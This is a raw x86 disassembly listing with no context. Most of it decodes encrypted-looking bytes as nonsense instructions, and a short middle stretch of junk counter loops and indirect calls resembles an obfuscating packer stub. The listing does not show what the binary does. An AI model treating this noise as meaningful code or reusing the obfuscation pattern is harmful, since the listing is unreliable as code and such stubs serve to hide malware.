  41887e:	out    0xfb,eax
  418880:	pop    es
  418881:	jmp    0xa4bf:0x326f4285
  418888:	lods   ax,WORD PTR ds:[esi]
  41888a:	mov    eax,0xb7c65a1f
  41888f:	std    
  418890:	ror    BYTE PTR [edi],0x44
  418893:	push   ecx
  418894:	inc    eax
  418895:	mov    dh,0x16
  418897:	out    dx,al
  418898:	popa   
  418899:	aad    0xbb
  41889b:	popf   
  41889c:	add    eax,0x50112106
  4188a1:	add    eax,0x244148b5
  4188a6:	inc    ecx
  4188a7:	cmp    dl,0xf2
  4188aa:	into   
  4188ab:	mov    eax,DWORD PTR [ebx+esi*2]
  4188ae:	xchg   ecx,eax
  4188af:	xchg   ebp,eax
  4188b0:	test   DWORD PTR [edx+0x5a],ebx
  4188b3:	add    al,0x7f
  4188b5:	mov    ds,WORD PTR [ebx+0x2a]
  4188b8:	test   al,0x9d
  4188ba:	icebp  
  4188bb:	(bad)  
  4188bd:	mov    eax,0x27398e4e
  4188c2:	rcr    edi,1
  4188c4:	jecxz  0x4188c3
  4188c6:	cmp    al,0x8a
  4188c8:	mov    dl,BYTE PTR [edx-0x1277ac13]
  4188ce:	mov    ch,0x41
  4188d0:	mov    eax,ds:0xc53e4fd6
  4188d5:	in     al,0x4f
  4188d7:	xchg   edi,eax
  4188d8:	mov    al,ds:0x7f90a81b
  4188dd:	cmc    
  4188de:	cmp    dh,BYTE PTR [ebp+0xa]
  4188e1:	mov    ebx,0x16401009
  4188e6:	(bad)  
  4188e7:	mov    ds:0x9074d8ad,al
  4188ec:	jns    0x41887c
  4188ee:	xor    BYTE PTR [esi],0x1b
  4188f1:	adc    ecx,DWORD PTR [edx+0x51de9426]
  4188f7:	mov    ah,0x6
  4188f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188fa:	jl     0x4188b7
  4188fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188fd:	sub    al,0x6c
  4188ff:	pusha  
  418900:	adc    al,0xbc
  418902:	push   0xffffff8b
  418904:	adc    eax,0x3f77c8a
  418909:	enter  0xaa8e,0x47
  41890d:	shl    DWORD PTR [esi+0x7a076695],0xa3
  418914:	pop    edi
  418915:	dec    esi
  418916:	mov    dh,BYTE PTR [ebp+0x6db0d654]
  41891c:	push   esp
  41891d:	ins    DWORD PTR es:[edi],dx
  41891e:	or     esp,esi
  418920:	sub    ebx,0xffffffb1
  418923:	sbb    eax,0x749093df
  418928:	mov    al,0x54
  41892a:	bound  edi,QWORD PTR [ebp+0x7b]
  41892d:	pop    eax
  41892e:	mov    ds:0x6337a399,al
  418933:	loope  0x418924
  418935:	ror    ebp,cl
  418937:	(bad)  
  418938:	push   edx
  418939:	and    bh,BYTE PTR ds:0x9fed3a20
  41893f:	int    0x97
  418941:	xlat   BYTE PTR ds:[ebx]
  418942:	or     al,0x57
  418944:	cdq    
  418945:	in     al,0x61
  418947:	push   0xffffffe3
  418949:	(bad)  
  41894a:	cmp    al,0xe8
  41894c:	xchg   esp,eax
  41894d:	inc    edx
  41894e:	arpl   WORD PTR [ecx],ax
  418950:	jo     0x4188e6
  418952:	dec    edx
  418953:	cmp    DWORD PTR [eax],ecx
  418955:	test   eax,0x508f782d
  41895a:	ss dec esi
  41895c:	js     0x418929
  41895e:	out    0x24,eax
  418960:	inc    ecx
  418961:	xlat   BYTE PTR ds:[ebx]
  418962:	mov    bh,0xca
  418964:	dec    esi
  418965:	scas   al,BYTE PTR es:[edi]
  418966:	jmp    0x41898b
  418968:	cli    
  418969:	arpl   WORD PTR [ebp-0x6],bx
  41896c:	adc    DWORD PTR [edi+0x1198beba],ecx
  418972:	mov    ebx,0xa02a76f6
  418977:	pop    esi
  418978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418979:	add    bh,cl
  41897b:	gs push ss
  41897d:	mov    al,ds:0x4e83b170
  418982:	(bad)  
  418983:	cs test eax,0xe1b8cc7
  418989:	cmp    BYTE PTR [ebp+ebx*2+0x1938402e],al
  418990:	xchg   esi,eax
  418991:	jo     0x41895b
  418993:	mov    ebx,0xd0545207
  418998:	rcl    BYTE PTR [ebx-0x45],1
  41899b:	pop    ebx
  41899c:	out    dx,al
  41899d:	in     eax,dx
  41899e:	fcomp  DWORD PTR [ebp+0x2f]
  4189a1:	mov    dl,0x5c
  4189a3:	jo     0x4189a8
  4189a5:	xor    eax,0x51549f2a
  4189aa:	push   cs
  4189ab:	sbb    eax,0xf580fb0a
  4189b0:	enter  0xee0e,0xcb
  4189b4:	pusha  
  4189b5:	push   ss
  4189b6:	mov    esi,0x6068927
  4189bb:	dec    ecx
  4189bc:	int    0xe4
  4189be:	(bad)  
  4189bf:	cwde   
  4189c0:	std    
  4189c1:	cmc    
  4189c2:	jne    0x418a0d
  4189c4:	sub    al,0xd4
  4189c6:	xor    ecx,eax
  4189c8:	add    ecx,esi
  4189ca:	adc    DWORD PTR ds:0x42a2ee,edi
  4189d0:	mov    DWORD PTR [ebp-0xc],ecx
  4189d3:	add    DWORD PTR ds:0x42a25a,0x6cdc
  4189dd:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4189e4:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  4189ee:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4189f5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4189fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4189ff:	mov    DWORD PTR ds:0x42a2ee,0x1b
  418a09:	cmp    DWORD PTR ds:0x42a2ee,0x0
  418a10:	je     0x418a4a
  418a16:	cmp    DWORD PTR ds:0x42a2ee,0x1c
  418a1d:	ja     0x418a4a
  418a23:	jmp    0x418a38
  418a28:	push   0x4b24
  418a2d:	push   0x42a296
  418a32:	call   DWORD PTR ds:0x42a3f2
  418a38:	mov    edi,DWORD PTR ds:0x42a2ee
  418a3e:	dec    edi
  418a3f:	mov    DWORD PTR ds:0x42a2ee,edi
  418a45:	jmp    0x418a09
  418a4a:	mov    DWORD PTR [ebp+0x8],ecx
  418a4d:	mov    edi,DWORD PTR ds:0x42a28e
  418a53:	xor    edi,DWORD PTR ds:0x42a2c6
  418a59:	mov    DWORD PTR ds:0x42a28e,edi
  418a5f:	mov    ecx,DWORD PTR [ebp+0x8]
  418a62:	xor    ecx,eax
  418a64:	mov    DWORD PTR ds:0x42a2b6,0x16
  418a6e:	cmp    DWORD PTR ds:0x42a2b6,0x0
  418a75:	je     0x418aac
  418a7b:	cmp    DWORD PTR ds:0x42a2b6,0x1d
  418a82:	ja     0x418aac
  418a88:	jmp    0x418a98
  418a8d:	push   0x42a28a
  418a92:	call   DWORD PTR ds:0x42a3f6
  418a98:	xor    edi,edi
  418a9a:	xor    edi,DWORD PTR ds:0x42a2b6
  418aa0:	dec    edi
  418aa1:	mov    DWORD PTR ds:0x42a2b6,edi
  418aa7:	jmp    0x418a6e
  418aac:	add    ecx,esi
  418aae:	mov    ecx,0x242ebc9
  418ab3:	mov    edi,0xf641bc8
  418ab8:	je     0x421e4f
  418abe:	and    DWORD PTR ds:0x42a27a,0x0
  418ac8:	jmp    0x418adc
  418acd:	xor    ebx,ebx
  418acf:	or     ebx,DWORD PTR ds:0x42a27a
  418ad5:	inc    ebx
  418ad6:	mov    DWORD PTR ds:0x42a27a,ebx
  418adc:	cmp    DWORD PTR ds:0x42a27a,0x14
  418ae3:	jae    0x418b2d
  418ae9:	cmp    DWORD PTR ds:0x42a27a,0xa
  418af0:	jb     0x418b2d
  418af6:	jmp    0x418b0e
  418afb:	push   DWORD PTR [ebp-0x14]
  418afe:	push   0x42a272
  418b03:	push   0x7a1d
  418b08:	call   DWORD PTR ds:0x42a3fa
  418b0e:	cmp    DWORD PTR ds:0x42a27a,0x9
  418b15:	jne    0x418b28
  418b1b:	mov    ebx,DWORD PTR ds:0x42a27a
  418b21:	inc    ebx
  418b22:	mov    DWORD PTR ds:0x42a27a,ebx
  418b28:	jmp    0x418acd
  418b2d:	mov    edx,DWORD PTR [ebp+0x8]
  418b30:	mov    ebx,DWORD PTR [ebp-0x8]
  418b33:	xor    edx,eax
  418b35:	xor    ebx,eax
  418b37:	sub    edx,ebx
  418b39:	sub    DWORD PTR ds:0x42a26e,edi
  418b3f:	sub    edx,esi
  418b41:	sub    ebx,0x5edd
  418b47:	xor    edx,eax
  418b49:	adc    ebx,DWORD PTR ds:0x42a272
  418b4f:	mov    DWORD PTR [ebp+0x8],edx
  418b52:	adc    DWORD PTR ds:0x42a2d6,edx
  418b58:	jmp    0x41aeb0
  418b5d:	add    al,ch
  418b5f:	test   BYTE PTR [edx-0x15ff7d6a],0x26
  418b66:	and    BYTE PTR [edx-0x3e],dl
  418b69:	mov    ah,0x15
  418b6b:	pushf  
  418b6c:	rol    bh,cl
  418b6e:	sbb    al,0x7c
  418b70:	add    DWORD PTR [esi+0x5e],0xffffff83
  418b74:	adc    DWORD PTR [edx-0x48988ef3],0x27
  418b7b:	push   esp
  418b7c:	cwde   
  418b7d:	xchg   ecx,eax
  418b7e:	(bad)  
  418b7f:	int3   
  418b80:	pop    esi
  418b81:	mov    ebp,0x103e982e
  418b86:	loopne 0x418bad
  418b88:	pop    es
  418b89:	mov    cl,0xaf
  418b8b:	jns    0x418ba0
  418b8d:	cmp    dh,BYTE PTR [esi+0x714fe3c3]
  418b93:	daa    
  418b94:	pop    esi
  418b95:	push   ecx
  418b96:	mov    edi,DWORD PTR [ecx+ebx*4+0x5]
  418b9a:	inc    ecx
  418b9b:	mov    al,ds:0xb8f6e5d4
  418ba0:	sbb    dh,bh
  418ba2:	mov    BYTE PTR [edx-0x3590f19e],bh
  418ba8:	pop    ecx
  418ba9:	retf   0x6398
  418bac:	pop    ecx
  418bad:	dec    ecx
  418bae:	cwde   
  418baf:	enter  0x17ce,0x46
  418bb3:	aas    
  418bb4:	jne    0x418b4a
  418bb6:	jb     0x418b5c
  418bb8:	push   ds
  418bb9:	jg     0x418bf8
  418bbb:	neg    BYTE PTR [ecx]
  418bbd:	cmp    al,0x33
  418bbf:	mov    ecx,0x61dd8e4d
  418bc4:	adc    ch,BYTE PTR [edi+0x8]
  418bc7:	jmp    0x418c2c
  418bc9:	push   ds
  418bca:	sbb    DWORD PTR [esi],ebp
  418bcc:	push   0x3f
  418bce:	sub    ah,BYTE PTR [ebx-0x32fa1f5e]
  418bd4:	stos   BYTE PTR es:[edi],al
  418bd5:	int    0x47
  418bd7:	(bad)  
  418bd8:	out    dx,eax
  418bd9:	mov    al,ds:0xac81f409
  418bde:	mov    edi,0xc35ab702
  418be3:	(bad)  
  418be4:	mov    cl,0xec
  418be6:	out    0x49,eax
  418be8:	adc    eax,0x775e64d6
  418bed:	xchg   ebp,eax
  418bee:	(bad)  
  418bef:	cli    
  418bf0:	xchg   ebp,eax
  418bf1:	popf   
  418bf2:	jb     0x418c5a
  418bf4:	inc    ecx
  418bf5:	dec    eax
  418bf6:	adc    esi,DWORD PTR [edx+0x69390742]
  418bfc:	inc    esi
  418bfd:	es popa 
  418bff:	mov    edx,0xc2cd2f41
  418c04:	xlat   BYTE PTR ds:[ebx]
  418c05:	and    al,0x62
  418c07:	push   ss
  418c08:	adc    DWORD PTR [ebx+edx*8],ecx
  418c0b:	inc    esi
  418c0c:	or     ebp,DWORD PTR [edi+0x3bcff843]
  418c12:	xor    ah,BYTE PTR [eax+0x3c]
  418c15:	frstor [ecx+edi*8+0x9b2da0f]
  418c1c:	(bad)  
  418c1d:	lock push ebx
  418c1f:	pop    ds
  418c20:	(bad)  
  418c21:	ja     0x418be2
  418c23:	jmp    0x418ca1
  418c25:	retf   0x53f0
  418c28:	stc    
  418c29:	mov    esp,DWORD PTR [eax-0x2670a0dc]
  418c2f:	and    esp,DWORD PTR ss:[ecx-0x158c567]
  418c36:	fwait
  418c37:	and    edi,ebp
  418c39:	cmp    eax,0xd6c19027
  418c3e:	shl    BYTE PTR [edi+0x54be2559],1
  418c44:	or     al,0x9c
  418c46:	repnz sbb al,0x1e
  418c49:	dec    ecx
  418c4a:	pop    es
  418c4b:	(bad)  
  418c4c:	and    ebx,0x78a4570f
  418c52:	ficomp DWORD PTR [ebp-0x2d]
  418c55:	bnd jns 0x418bfc
  418c58:	xchg   edi,eax
  418c59:	stc    
  418c5a:	js     0x418c78
  418c5c:	push   eax
  418c5d:	ja     0x418c43
  418c5f:	inc    eax
  418c60:	mov    edi,DWORD PTR [eax]
  418c62:	aad    0xc7
  418c64:	aam    0xcb
  418c66:	sbb    DWORD PTR [eax-0x795d6269],esp
  418c6c:	aad    0x3b
  418c6e:	jmp    0x93c4:0x7c117373
  418c75:	pop    es
  418c76:	not    DWORD PTR [ecx]
  418c78:	ds aas 
  418c7a:	ins    BYTE PTR es:[edi],dx
  418c7b:	xchg   esi,eax
  418c7c:	dec    esi
  418c7d:	js     0x418c8c
  418c7f:	and    DWORD PTR [edx+0xf6dabf9],eax
  418c85:	mov    bh,0xb4
  418c87:	ficom  WORD PTR [esi]
  418c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c8a:	clc    
  418c8b:	in     al,dx
  418c8c:	dec    edi
  418c8d:	aaa    
  418c8e:	adc    BYTE PTR [edx],al
  418c90:	stc    
  418c91:	scas   al,BYTE PTR es:[edi]
  418c92:	scas   eax,DWORD PTR es:[edi]
  418c93:	mov    dh,ah
  418c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c96:	pop    edi
  418c97:	mul    BYTE PTR [ecx-0x71773cb3]
  418c9d:	mov    al,0xd8
  418c9f:	test   DWORD PTR [ecx+0x6e47db3d],ecx
  418ca5:	sbb    al,dh
  418ca7:	dec    edx
  418ca8:	cmp    al,dh
  418caa:	loopne 0x418c7d
  418cac:	leave  
  418cad:	cmp    ecx,DWORD PTR [edx-0x66]
  418cb0:	adc    DWORD PTR [eax-0x47],esp
  418cb3:	pushf  
  418cb4:	icebp  
  418cb5:	ja     0x418c66
  418cb7:	fisttp QWORD PTR [ebp-0x1a542b7c]
  418cbd:	(bad)  
  418cbe:	imul   ebx,DWORD PTR [eax+0x2e],0x6b
  418cc2:	jge    0x418c5a
  418cc4:	in     al,dx
  418cc5:	mov    eax,0x995fe5aa
  418cca:	fsub   st(5),st
  418ccc:	test   eax,0x6f4d13a2
  418cd1:	inc    ecx
  418cd2:	sub    eax,0x57d1bfc3
  418cd7:	stos   DWORD PTR es:[edi],eax
  418cd8:	std    
  418cd9:	push   esp
  418cda:	inc    esi
  418cdb:	inc    edx
  418cdc:	cmp    BYTE PTR [edx+ebp*4-0x32776dc1],dl
  418ce3:	cmp    eax,0x8cc27865
  418ce8:	adc    edx,DWORD PTR [ecx-0x6a]
  418ceb:	stc    
  418cec:	sub    dh,dh
  418cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cef:	jmp    0x3903e29c
  418cf4:	cmp    eax,0x3014cca6
  418cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cfa:	dec    ebx
  418cfb:	sti    
  418cfc:	imul   ebx,DWORD PTR [ebp-0x4b629b00],0x24
  418d03:	cmc    
  418d04:	int3   
  418d05:	mov    ds,WORD PTR [ebp+0x771c396f]
  418d0b:	sbb    ch,al
  418d0d:	into   
  418d0e:	xlat   BYTE PTR ds:[ebx]
  418d0f:	pop    ss
  418d10:	sbb    al,0xa7
  418d12:	mov    dl,0xd
  418d14:	rol    esi,1
  418d16:	shr    DWORD PTR [edi+edx*8+0x1c7cd305],0x20
  418d1e:	popa   
  418d1f:	add    al,0x28
  418d21:	pop    es
  418d22:	inc    ecx
  418d23:	aad    0x31
  418d25:	out    dx,al
  418d26:	add    eax,DWORD PTR [eax+0x4d]
  418d29:	psrad  mm4,QWORD PTR [edi]
  418d2c:	cli    
  418d2d:	sub    al,0x90
  418d2f:	ret    
  418d30:	lods   al,BYTE PTR ds:[esi]
  418d31:	cli    
  418d32:	xchg   edx,eax
  418d33:	push   edi
  418d34:	sub    BYTE PTR [ecx-0xe],ah
  418d37:	stos   DWORD PTR es:[edi],eax
  418d38:	cmp    eax,0xf02971cf
  418d3d:	push   cs
  418d3e:	ret    0x4ad8
  418d41:	inc    esi
  418d42:	sbb    al,dh
  418d44:	scas   eax,DWORD PTR es:[edi]
  418d45:	jno    0x418d0a
  418d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d48:	les    edx,FWORD PTR [ebx+eiz*4-0x51ee77f7]
  418d4f:	xchg   edi,eax
  418d50:	mov    bl,0xda
  418d52:	fs aaa 
  418d54:	daa    
  418d55:	mov    ebx,0x4e0cea75
  418d5a:	dec    ebx
  418d5b:	push   cs
  418d5c:	inc    ecx
  418d5d:	xchg   ecx,eax
  418d5e:	ins    BYTE PTR es:[edi],dx
  418d5f:	jo     0x418d7f
  418d61:	cli    
  418d62:	outs   dx,BYTE PTR ds:[esi]
  418d63:	push   0x77363257
  418d68:	push   edi
  418d69:	jl     0x418d8b
  418d6b:	jecxz  0x418d29
  418d6d:	add    eax,0xd7f447d3
  418d72:	mov    cl,0xe7
  418d74:	or     DWORD PTR [eax-0x3d],0x47d6c82b
  418d7b:	cmp    bh,BYTE PTR ds:0xb70d666e
  418d81:	test   dh,0x3
  418d84:	leave  
  418d85:	add    al,0x45
  418d87:	ret    
  418d88:	outs   dx,BYTE PTR ds:[esi]
  418d89:	in     al,0x2e
  418d8b:	adc    al,0x15
  418d8d:	mov    eax,0xd9c2bae6
  418d92:	bound  esi,QWORD PTR [esi+0x63]
  418d95:	mov    edi,0x8d382b9b
  418d9a:	int3   
  418d9b:	imul   ecx,DWORD PTR ds:0x431ae7ee,0x7147d003
  418da5:	xor    dl,0xe4
  418da8:	fisub  DWORD PTR [edi]
  418daa:	sub    BYTE PTR [eax-0x5e73f1ee],ah
  418db0:	ret    
  418db1:	je     0x418d48
  418db3:	sub    eax,0x3722b9cb
  418db8:	or     al,0x9d
  418dba:	add    bh,dh
  418dbc:	and    edi,DWORD PTR [ebp+0x5cc806e9]
  418dc2:	xchg   esi,eax
  418dc3:	(bad)  
  418dc4:	shl    edi,0xfb
  418dc7:	aad    0xdb
  418dc9:	mov    eax,ebx
  418dcb:	iret   
  418dcc:	sub    al,0x4
  418dce:	lock xlat BYTE PTR ds:[ebx]
  418dd0:	and    al,0x66
  418dd2:	test   eax,0xbb6f305c
  418dd7:	and    DWORD PTR [edx],ebp
  418dd9:	hlt    
  418dda:	pop    ebx
  418ddb:	gs xchg ebx,eax
  418ddd:	mov    BYTE PTR [esi+0x18669f63],ah
  418de3:	dec    ebp
  418de4:	mov    ebp,0xd81e1669
  418de9:	cmp    al,0x4
  418deb:	into   
  418dec:	je     0x418e48
  418dee:	or     BYTE PTR [eax],dh
  418df0:	inc    eax
  418df1:	mov    bl,0x1a
  418df3:	dec    edx
  418df4:	dec    edi
  418df5:	loope  0x418de6
  418df7:	jecxz  0x418db0
  418df9:	or     cl,cl
  418dfb:	hlt    
  418dfc:	cmp    bh,al
  418dfe:	test   eax,0xc5207902
  418e03:	adc    BYTE PTR cs:[ebx+0x20],0xd6
  418e08:	jle    0x418dfc
  418e0a:	mov    eax,ds:0xbe174c21
  418e0f:	mov    BYTE PTR [edi-0x14a0a53a],ch
  418e15:	and    eax,0x2d82d031
  418e1a:	xor    DWORD PTR [edx+0x540cfa9b],ecx
  418e20:	inc    eax
  418e21:	(bad)  
  418e22:	push   esi
  418e23:	mov    bl,0x6d
  418e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e26:	inc    ecx
  418e27:	mov    al,0x19
  418e29:	outs   dx,BYTE PTR ds:[esi]
  418e2a:	js     0x418e17
  418e2c:	in     al,dx
  418e2d:	push   ss
  418e2e:	jo     0x418e98
  418e30:	sub    DWORD PTR [ecx],esp
  418e32:	neg    esp
  418e34:	sbb    BYTE PTR [eax+0xf],ch
  418e37:	retf   
  418e38:	ficom  DWORD PTR [edi]
  418e3a:	sub    DWORD PTR [esi+0x51],esi
  418e3d:	dec    ecx
  418e3e:	mov    ah,bh
  418e40:	pusha  
  418e41:	jne    0x418ebe
  418e43:	jmp    0x7c83:0xfef4
  418e49:	rcl    BYTE PTR [esp+ecx*1+0x5e],cl
  418e4d:	lods   eax,DWORD PTR ds:[esi]
  418e4e:	ds stos DWORD PTR es:[edi],eax
  418e50:	das    
  418e51:	xor    al,0xa
  418e53:	(bad)  
  418e54:	call   0xbbc1:0x1bb97d12
  418e5b:	push   cs
  418e5c:	inc    edi
  418e5d:	rcr    BYTE PTR [eax],1
  418e5f:	push   ebx
  418e60:	xchg   esp,eax
  418e61:	jecxz  0x418dfe
  418e63:	dec    edi
  418e64:	aas    
  418e65:	mov    esi,0x492e075
  418e6a:	push   eax
  418e6b:	sar    BYTE PTR gs:[edx],0xca
  418e6f:	or     edx,DWORD PTR [ebx+0x64]
  418e72:	jmp    0x94063ebc
  418e77:	xor    esi,DWORD PTR ds:0x70467d3a
  418e7d:	add    BYTE PTR [edx-0x19cf039c],ah
  418e83:	sti    
  418e84:	push   0x656e01a1
  418e89:	aaa    
  418e8a:	xchg   esp,eax
  418e8b:	dec    edx
  418e8c:	ja     0x418e46
  418e8e:	ret    
  418e8f:	push   ebp
  418e90:	les    esp,FWORD PTR [edx+0x41]
  418e93:	push   esi
  418e94:	jne    0x418ead
  418e96:	sub    DWORD PTR [ebx],edx
  418e98:	das    
  418e99:	nop
  418e9a:	mov    eax,0xaf617902
  418e9f:	jno    0x418f17
  418ea1:	clc    
  418ea2:	retf   
  418ea3:	dec    eax
  418ea4:	(bad)  
  418ea5:	xchg   edx,eax
  418ea6:	loop   0x418ef6
  418ea8:	lods   al,BYTE PTR ds:[esi]
  418ea9:	cmp    al,0x2e
  418eab:	push   edx
  418eac:	sahf   
  418ead:	jg     0x418f2b
  418eaf:	fnstsw WORD PTR [ebx]
  418eb1:	jbe    0x418ef6
  418eb3:	add    DWORD PTR [ecx+0x4f],esp
  418eb6:	daa    
  418eb7:	mov    eax,0xc0e3cf9c
  418ebc:	sbb    DWORD PTR [ecx-0x60],edi
  418ebf:	xchg   edi,eax
  418ec0:	xchg   esi,eax
  418ec1:	pop    eax
  418ec2:	xchg   esp,eax
  418ec3:	pop    esp
  418ec4:	out    dx,al
  418ec5:	jnp    0x418efa
  418ec7:	clc    
  418ec8:	cmp    DWORD PTR [esi],edi
  418eca:	adc    BYTE PTR [eax+0x18dd8846],ah
  418ed0:	(bad)  
  418ed1:	rcr    BYTE PTR [ebp+0x52],1
  418ed4:	mov    cl,dh
  418ed6:	scas   eax,DWORD PTR es:[edi]
  418ed7:	add    bl,dh
  418ed9:	add    eax,0x7ecde312
  418ede:	pop    esi
  418edf:	into   
  418ee0:	test   esp,eax
  418ee2:	push   edx
  418ee3:	mov    esi,0x26efd488
  418ee8:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418eea:	mov    eax,ds:0xacb52f47
  418eef:	mov    bl,0xb1
  418ef1:	pushf  
  418ef2:	push   edi
  418ef3:	sbb    BYTE PTR [eax],cl
  418ef5:	lea    ecx,[ecx+0x8]
  418ef8:	shl    BYTE PTR [eax],1
  418efa:	xor    edi,DWORD PTR [ebp+edi*2+0x231ee970]
  418f01:	mov    bh,0x3e
  418f03:	mov    bl,0xba
  418f05:	ficom  WORD PTR [edx-0x52]
  418f08:	inc    esi
  418f09:	(bad)  
  418f0a:	cmp    al,0x1
  418f0c:	mov    esp,0x5772ba7c
  418f11:	xchg   ebp,eax
  418f12:	lods   eax,DWORD PTR ds:[esi]
  418f13:	out    dx,eax
  418f14:	ds push ecx
  418f16:	jmp    0x418f51
  418f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f19:	inc    ebx
  418f1a:	adc    eax,0xeb0b2db7
  418f1f:	cmp    DWORD PTR [ebp+0x59597d6a],edx
  418f25:	and    eax,0x37c15d9b
  418f2a:	sub    ecx,DWORD PTR [ebx+0x33965d91]
  418f30:	mov    ds:0x1105c8cd,eax
  418f35:	adc    eax,0x9e80e299
  418f3a:	xchg   ebx,eax
  418f3b:	dec    ebp
  418f3c:	and    BYTE PTR [eax-0x19],0x94
  418f40:	pop    es
  418f41:	enter  0x3759,0xe5
  418f45:	pop    ebx
  418f46:	(bad)  
  418f47:	aas    
  418f48:	(bad)  
  418f49:	outs   dx,BYTE PTR ds:[esi]
  418f4a:	imul   edi,DWORD PTR [ecx+0x3f],0xa1e25172
  418f51:	add    edx,edx
  418f53:	pop    ebp
  418f54:	and    BYTE PTR [ebp+eax*8-0x5],ah
  418f58:	and    DWORD PTR [eax+ebx*4-0x7b],ecx
  418f5c:	ficomp WORD PTR [esi+0xfac2ece]
  418f62:	or     DWORD PTR [esi],eax
  418f64:	fst    DWORD PTR [ebx-0x80]
  418f67:	pushf  
  418f68:	mov    dh,0x9a
  418f6a:	add    al,0x15
  418f6c:	(bad)  
  418f6d:	out    0xc4,al
  418f6f:	dec    esp
  418f70:	pop    esp
  418f71:	or     dh,BYTE PTR [ebp+eiz*2-0x8]
  418f75:	cli    
  418f76:	xor    eax,0x1c60218f
  418f7b:	sub    al,0xa7
  418f7d:	call   FWORD PTR [ecx-0x22]
  418f80:	xchg   esp,eax
  418f81:	dec    ebp
  418f82:	imul   esp,DWORD PTR [edi+0x5f298fd6],0x9865d7a1
  418f8c:	jle    0x418f5c
  418f8e:	leave  
  418f8f:	jns    0x418fad
  418f91:	jle    0x418f1a
  418f93:	xchg   edi,eax
  418f94:	loope  0x418f4c
  418f96:	xchg   ecx,eax
  418f97:	mov    cl,0x5e
  418f99:	mov    esp,ebp
  418f9b:	mov    ecx,0xa3390c11
  418fa0:	shl    BYTE PTR [ebp-0x4e],cl
  418fa3:	sbb    eax,0x7b07af21
  418fa8:	aam    0x8d
  418faa:	xor    bh,BYTE PTR [edx+ecx*1]
  418fad:	pop    ecx
  418fae:	es fwait
  418fb0:	clc    
  418fb1:	cmc    
  418fb2:	in     al,0x53
  418fb4:	push   ebp
  418fb5:	leave  
  418fb6:	popa   
  418fb7:	pop    eax
  418fb8:	mov    esi,0xf0534662
  418fbd:	stos   DWORD PTR es:[edi],eax
  418fbe:	adc    ch,BYTE PTR [esi+0x64e8b5ae]
  418fc4:	or     DWORD PTR [esi],eax
  418fc6:	mov    al,0x81
  418fc8:	pop    edi
  418fc9:	cdq    
  418fca:	(bad)  
  418fcc:	mov    edi,0xc96d134e
  418fd1:	test   eax,0x1ea3026f
  418fd6:	and    BYTE PTR [ebp+0x55],al
  418fd9:	dec    ebp
  418fda:	ins    BYTE PTR es:[edi],dx
  418fdb:	dec    edx
  418fdc:	jge    0x41900e
  418fde:	and    DWORD PTR [edx+0x868855],ecx
  418fe4:	loope  0x418f68
  418fe6:	pusha  
  418fe7:	inc    ebp
  418fe8:	jecxz  0x418fed
  418fea:	outs   dx,BYTE PTR ds:[esi]
  418feb:	mov    al,0x2c
  418fed:	loopne 0x419010
  418fef:	retf   
  418ff0:	dec    esp
  418ff1:	call   0xfc99:0xae83cc1a
  418ff8:	enter  0xb5df,0x37
  418ffc:	fcompp 
  418ffe:	out    dx,eax
  418fff:	jmp    0x419023
  419001:	and    DWORD PTR [esi-0x7ed45fcd],esi
  419007:	pushf  
  419008:	sar    DWORD PTR [edx],0x89
  41900b:	cmp    al,0x70
  41900d:	shl    BYTE PTR [esi+0x45],1
  419010:	cld    
  419011:	sub    eax,0x924361ba
  419016:	lock in eax,dx
  419018:	inc    ebx
  419019:	imul   eax,ebx,0x30a5453e
  41901f:	sbb    BYTE PTR ds:0x5dfb8158,dh
  419025:	jns    0x419034
  419027:	std    
  419028:	scas   al,BYTE PTR es:[edi]
  419029:	pop    DWORD PTR [ebx+0x4bac6ed2]
  41902f:	mov    ebp,0x9c19160
  419034:	sbb    bl,BYTE PTR [eax]
  419036:	jmp    FWORD PTR [edx]
  419038:	or     bl,dh
  41903a:	push   esp
  41903b:	and    DWORD PTR [edi+0x7b4c8cd9],esi
  419041:	mov    bl,0x6e
  419043:	loop   0x41906b
  419045:	adc    BYTE PTR ds:0x2db4c88a,dl
  41904b:	sub    dh,dh
  41904d:	cmp    al,0xe4
  41904f:	test   BYTE PTR [ebp-0x30],ch
  419052:	mov    BYTE PTR [ebp+0x2c],cl
  419055:	mov    ah,0xea
  419057:	jle    0x419085
  419059:	je     0x41900e
  41905b:	test   DWORD PTR [edx],edi
  41905d:	and    eax,0xc78507db
  419062:	adc    DWORD PTR [edx+0x24],edi
  419065:	outs   dx,DWORD PTR ds:[esi]
  419066:	cld    
  419067:	rcl    BYTE PTR [ecx+0x3f],cl
  41906a:	inc    edi
  41906b:	scas   eax,DWORD PTR es:[edi]
  41906c:	pop    ebx
  41906d:	cmp    BYTE PTR [edx],dh
  41906f:	xchg   edx,eax
  419070:	pusha  
  419071:	xchg   edx,eax
  419072:	imul   eax,DWORD PTR [edi],0xae62723
  419078:	mov    eax,ds:0x8ff9b589
  41907d:	cmp    bh,al
  41907f:	adc    bh,cl
  419081:	(bad)  
  419083:	and    ah,BYTE PTR [ebx]
  419085:	cmc    
  419086:	pop    ds
  419087:	pop    edx
  419088:	aas    
  419089:	cmc    
  41908a:	(bad)  
  41908b:	mov    esi,0x37fd0484
  419090:	push   ecx
  419091:	mov    eax,0xc62d275e
  419096:	int    0x88
  419098:	pop    ss
  419099:	jnp    0x419110
  41909b:	jns    0x419033
  41909d:	xchg   esi,eax
  41909e:	clc    
  41909f:	sbb    edx,DWORD PTR [ebx]
  4190a1:	scas   al,BYTE PTR es:[edi]
  4190a2:	imul   edi
  4190a4:	fst    DWORD PTR [ecx+ebp*4+0x58]
  4190a8:	add    bl,BYTE PTR ss:[ebx+0x19087174]
  4190af:	rcr    DWORD PTR [eax+0x35],1
  4190b2:	(bad)  
